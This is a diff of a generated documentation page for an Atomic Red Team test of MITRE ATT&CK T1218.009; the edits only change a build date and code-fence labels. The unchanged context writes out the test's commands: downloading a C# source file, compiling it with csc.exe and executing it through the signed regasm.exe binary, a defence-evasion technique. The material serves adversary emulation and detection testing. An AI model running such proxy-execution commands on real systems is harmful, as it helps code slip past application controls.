@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.009"
 attack_technique_name: "Signed Binary Proxy Execution: Regsvcs/Regasm"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112"
@@ -57,13 +57,13 @@ The CSharp source file must exist on disk at specified location (#{source_file})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{source_file}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{source_file}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs" -OutFile "#{source_file}"
 ```
@@ -74,14 +74,14 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library "#{source_file}"
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{output_file} >nul 2>&1
 ```
 
